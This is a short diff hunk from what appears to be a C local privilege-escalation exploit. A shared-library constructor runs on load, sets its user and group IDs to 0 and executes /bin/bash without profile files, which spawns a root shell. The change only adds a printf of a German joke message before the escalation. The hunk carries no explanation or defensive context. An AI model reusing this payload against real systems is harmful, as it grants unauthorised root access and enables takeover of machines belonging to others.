@@ -37,6 +37,8 @@ __attribute__((constructor)) void init(void)
 	char *sh[] = {"/bin/sh", NULL};
 	char *bash[] = {"/bin/bash", "--norc", "--noprofile", NULL};
 
+	printf("\n[*] Das trifft nach meiner Kenntnis ... ist das sofort, unverzüglich.\n\n");
+
 	setuid(0);
 	setgid(0);
 	execve(*bash, bash, NULL);
